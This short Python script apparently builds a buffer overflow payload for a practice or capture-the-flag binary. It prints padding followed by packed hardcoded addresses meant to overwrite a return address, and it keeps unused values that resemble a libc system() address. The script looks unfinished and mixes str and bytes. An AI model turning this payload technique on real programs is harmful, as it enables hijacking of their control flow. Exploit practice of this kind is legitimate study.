import struct

padding = 'aaaabbbbccccddeeee'
system1 = struct.pack('I', 0xf7a33440)
system2 = struct.pack('I', 0x7fff)


stack = struct.pack('I', 0xffffdee8)
stack2 = struct.pack('I', 0x0000)
print(padding + struct.pack('I', 0x401156) + stack2)
# ffffdee8
# 0x401200
